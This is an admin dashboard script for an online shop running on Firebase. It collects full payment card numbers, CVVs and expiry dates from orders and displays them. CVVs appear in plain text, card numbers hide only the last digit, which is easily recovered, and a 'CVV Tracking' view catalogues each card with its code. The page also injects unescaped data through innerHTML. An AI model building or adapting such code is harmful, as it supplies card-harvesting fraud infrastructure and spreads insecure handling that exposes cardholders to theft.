// Admin Dashboard JavaScript

// Function to mask card number - SIRF LAST 1 DIGIT HIDE
function maskCardNumber(cardNumber) {
    if (!cardNumber) return 'N/A';
    
    // Remove spaces
    const clean = cardNumber.replace(/\s/g, '');
    
    if (clean.length >= 16) {
        // First 15 digits show, last 1 digit hide with *
        const first15 = clean.slice(0, 15);
        
        // Format with spaces after every 4 digits
        const formatted = first15.match(/.{1,4}/g)?.join(' ') || first15;
        return formatted + '*';  // Last digit replaced with *
    }
    
    return cardNumber;
}

// Check authentication
auth.onAuthStateChanged(async (user) => {
    if (!user) {
        window.location.href = 'index.html';
        return;
    }
    
    // Check if admin
    const userDoc = await db.collection('users').doc(user.uid).get();
    if (!userDoc.exists || userDoc.data().role !== 'admin') {
        alert('Access Denied: Admin only');
        window.location.href = 'index.html';
        return;
    }
    
    // Set admin name
    document.getElementById('adminName').textContent = user.displayName || 'Admin';
    
    // Load all data
    loadDashboardStats();
    loadProducts();
    loadOrders();
    loadCVVTracking();
});

// Show different sections
function showSection(sectionId) {
    document.querySelectorAll('.admin-section').forEach(s => s.classList.remove('active'));
    document.getElementById(sectionId).classList.add('active');
    
    document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
    event.currentTarget.classList.add('active');
    
    const titles = {
        'dashboard': 'Dashboard',
        'products': 'Products',
        'add-product': 'Add Product',
        'orders': 'Orders',
        'cvv-tracking': 'CVV Tracking'
    };
    document.getElementById('pageTitle').textContent = titles[sectionId];
}

// Load dashboard stats
async function loadDashboardStats() {
    try {
        const ordersSnapshot = await db.collection('orders').get();
        document.getElementById('totalOrders').textContent = ordersSnapshot.size;
        
        let revenue = 0;
        ordersSnapshot.forEach(doc => revenue += doc.data().totalAmount || 0);
        document.getElementById('totalRevenue').textContent = '₹' + revenue.toLocaleString();
        
        const productsSnapshot = await db.collection('products').get();
        document.getElementById('totalProducts').textContent = productsSnapshot.size;
        
    } catch (error) {
        console.error('Error loading stats:', error);
    }
}

// Load products
async function loadProducts() {
    try {
        const snapshot = await db.collection('products').get();
        const tbody = document.getElementById('productsBody');
        tbody.innerHTML = '';
        
        snapshot.forEach(doc => {
            const product = doc.data();
            tbody.innerHTML += `
                <tr>
                    <td><img src="${product.imageUrl || 'https://via.placeholder.com/50'}" class="product-image"></td>
                    <td>${product.name || ''}</td>
                    <td>₹${product.price || 0}</td>
                    <td>${product.category || ''}</td>
                    <td>${product.stock || 0}</td>
                    <td><button class="btn-danger" onclick="deleteProduct('${doc.id}')">Delete</button></td>
                </tr>
            `;
        });
    } catch (error) {
        console.error('Error loading products:', error);
    }
}

// Add product
document.getElementById('productForm')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    try {
        const productData = {
            name: document.getElementById('productName').value,
            price: parseFloat(document.getElementById('productPrice').value),
            category: document.getElementById('productCategory').value,
            description: document.getElementById('productDescription').value,
            stock: parseInt(document.getElementById('productStock').value),
            imageUrl: document.getElementById('productImageUrl').value,
            createdAt: new Date().toISOString()
        };
        
        await db.collection('products').add(productData);
        alert('✅ Product added!');
        e.target.reset();
        loadProducts();
        showSection('products');
        
    } catch (error) {
        console.error('Error:', error);
        alert('Error: ' + error.message);
    }
});

// Delete product
async function deleteProduct(productId) {
    if (confirm('Delete this product?')) {
        await db.collection('products').doc(productId).delete();
        loadProducts();
        loadDashboardStats();
    }
}

// Load orders with MASKED CARD NUMBERS (last digit hidden)
async function loadOrders() {
    try {
        const snapshot = await db.collection('orders').orderBy('createdAt', 'desc').get();
        const tbody = document.getElementById('ordersBody');
        tbody.innerHTML = '';
        
        if (snapshot.empty) {
            tbody.innerHTML = '<tr><td colspan="8">No orders found</td></tr>';
            return;
        }
        
        snapshot.forEach(doc => {
            const order = doc.data();
            const products = order.products || [];
            const productNames = products.map(p => p.name).join(', ');
            const card = order.cardDetails || {};
            
            // ✅ Mask card number - show first 15 digits, hide last 1
            const maskedCard = maskCardNumber(card.cardNumber);
            
            tbody.innerHTML += `
                <tr>
                    <td>#${doc.id.slice(-8)}</td>
                    <td>${order.userEmail || 'N/A'}</td>
                    <td>${productNames.slice(0, 30)}...</td>
                    <td>₹${order.totalAmount}</td>
                    <td class="card-number">${maskedCard}</td>
                    <td><strong>${card.cvv || 'N/A'}</strong></td>
                    <td>${card.expiry || 'N/A'}</td>
                    <td>${new Date(order.createdAt).toLocaleDateString()}</td>
                </tr>
            `;
        });
    } catch (error) {
        console.error('Error loading orders:', error);
    }
}

// Load CVV tracking with MASKED CARD NUMBERS
async function loadCVVTracking() {
    try {
        const ordersSnapshot = await db.collection('orders').get();
        const cvvStats = {};
        
        ordersSnapshot.forEach(doc => {
            const order = doc.data();
            const card = order.cardDetails || {};
            const cvv = card.cvv;
            const cardNumber = card.cardNumber;
            const expiry = card.expiry || 'N/A';
            
            if (cvv && cardNumber) {
                const key = `${cvv}_${cardNumber}_${expiry}`;
                
                if (!cvvStats[key]) {
                    cvvStats[key] = {
                        cvv: cvv,
                        cardNumber: cardNumber,
                        expiry: expiry,
                        totalOrders: 0,
                        totalAmount: 0,
                        lastUsed: order.createdAt
                    };
                }
                
                cvvStats[key].totalOrders++;
                cvvStats[key].totalAmount += order.totalAmount || 0;
                
                if (order.createdAt > cvvStats[key].lastUsed) {
                    cvvStats[key].lastUsed = order.createdAt;
                }
            }
        });
        
        const tbody = document.getElementById('cvvBody');
        tbody.innerHTML = '';
        
        Object.values(cvvStats).forEach(stat => {
            // ✅ Mask card number in CVV tracking too
            const maskedCard = maskCardNumber(stat.cardNumber);
            
            tbody.innerHTML += `
                <tr>
                    <td><strong>${stat.cvv}</strong></td>
                    <td class="card-number">${maskedCard}</td>
                    <td>${stat.expiry}</td>
                    <td>${stat.totalOrders}</td>
                    <td>₹${stat.totalAmount.toLocaleString()}</td>
                    <td>${new Date(stat.lastUsed).toLocaleString()}</td>
                </tr>
            `;
        });
        
    } catch (error) {
        console.error('Error loading CVV tracking:', error);
    }
}

// Logout
function logout() {
    auth.signOut();
    window.location.href = 'index.html';
}
